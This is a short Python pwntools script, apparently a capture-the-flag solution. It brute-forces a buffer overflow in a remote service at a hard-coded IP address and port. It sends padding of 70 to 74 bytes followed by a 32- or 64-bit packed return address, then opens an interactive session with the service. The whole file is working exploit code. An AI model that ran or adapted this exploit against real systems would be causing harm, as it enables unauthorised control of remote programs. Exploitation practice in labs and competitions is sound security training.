from pwn import *
#context.log_level = 'debug'
addr = 0x40060d

def fuzz(r, num, flag):
    payload = 'a' * num
    if flag==1:
        payload += p32(addr)
    if flag==2:
        payload += p64(addr)
    r.recvuntil(">")
    r.sendline(payload)

def main():
    for i in range(70, 75):
        print(i)
        for j in range(3):
            try:
                r = remote("111.198.29.45", 46588)
                fuzz(r, i, j)
                text = r.recv()
                print('text.len='+str(len(text))+'text='+text)
                print('num='+str(i)+' flag='+str(j))
                r.interactive()
            except:
                r.close()

if __name__ == '__main__':
    main()
